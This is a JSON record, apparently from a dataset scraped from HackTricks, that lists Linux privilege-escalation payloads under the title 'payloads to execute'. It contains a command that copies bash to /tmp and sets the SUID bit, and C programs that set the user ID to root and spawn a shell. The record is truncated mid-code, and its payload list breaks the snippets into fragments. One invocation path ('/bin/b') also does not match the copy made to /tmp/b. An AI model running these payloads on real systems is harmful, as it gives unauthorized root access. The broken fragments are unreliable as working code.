@@ -1,0 +1,27 @@
+{
+  "id": "linux_hardening_76e93b591f5d",
+  "category": "linux-hardening",
+  "title": "payloads to execute",
+  "description": "# Payloads to execute\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Bash\n\n```bash\ncp /bin/bash /tmp/b && chmod +s /tmp/b\n/bin/b -p #Maintains root privileges from suid, working in debian & buntu\n```\n\n## C\n\n```c\n//gcc payload.c -o payload\nint main(void){\n    setresuid(0, 0, 0); //Set as user suid user\n    system(\"/bin/sh\");\n    return 0;\n}\n```\n\n```c\n//gcc payload.c -o payload\n#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\n\nint main(){\n    setuid(getuid());\n    system(\"/bin",
+  "payloads": [
+    "# Payloads to execute",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Bash",
+    "```bash",
+    "cp /bin/bash /tmp/b && chmod +s /tmp/b",
+    "/bin/b -p #Maintains root privileges from suid, working in debian & buntu",
+    "//gcc payload.c -o payload",
+    "int main(void){",
+    "setresuid(0, 0, 0); //Set as user suid user",
+    "system(\"/bin/sh\");",
+    "return 0;",
+    "//gcc payload.c -o payload",
+    "#include <stdio.h>",
+    "#include <unistd.h>",
+    "#include <sys/types.h>"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/linux-hardening/privilege-escalation/payloads-to-execute.md"
+  ]
+}
